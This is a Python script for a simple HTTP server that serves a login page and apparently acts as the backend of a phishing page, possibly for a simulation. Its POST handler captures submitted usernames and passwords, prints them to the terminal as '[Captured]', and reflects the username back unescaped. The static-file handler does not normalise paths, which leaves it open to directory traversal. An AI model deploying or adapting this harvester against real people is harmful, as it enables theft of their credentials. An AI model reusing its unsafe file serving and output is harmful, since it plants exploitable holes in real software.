from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import os

# Load your HTML file as a string (index/login page)
with open("login.html", "r") as file:
    html_content = file.read()


class SimpleHandler(BaseHTTPRequestHandler):

    # ✅ helper to send HTML
    def _send_html(self, code, content):
        self.send_response(code)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(content.encode())

    def do_GET(self):
        if self.path in ("/", "/index.html", "/login.html"):
            self._send_html(200, html_content)

        elif self.path.startswith("/static/"):
            file_path = self.path.lstrip("/")  # strip leading slash
            if os.path.isfile(file_path):
                self.send_response(200)

                # set correct MIME type
                if file_path.endswith(".png"):
                    self.send_header("Content-type", "image/png")
                elif file_path.endswith(".jpg") or file_path.endswith(".jpeg"):
                    self.send_header("Content-type", "image/jpeg")
                elif file_path.endswith(".css"):
                    self.send_header("Content-type", "text/css")
                elif file_path.endswith(".js"):
                    self.send_header("Content-type", "application/javascript")
                else:
                    self.send_header("Content-type", "application/octet-stream")

                self.end_headers()
                with open(file_path, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_error(404)

        else:
            self.send_error(404)

    def do_POST(self):
        print("🔔 POST request received!")

        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = urllib.parse.parse_qs(post_data.decode())

        username = data.get('real_username', [''])[0]
        password = data.get('password', [''])[0]

        # log in terminal
        print("\n[Captured]")
        print(f"Username: {username}")
        print(f"Password: {password}\n")

        # respond back to client
        self._send_html(200, f"""
            <h2>Captured: {username}</h2>
            <p>Simulation complete.</p>
        """)


# Start the server
if __name__ == "__main__":
    httpd = HTTPServer(('0.0.0.0', 8080), SimpleHandler)
    print("🚀 Server running at http://localhost:8080")
    httpd.serve_forever()
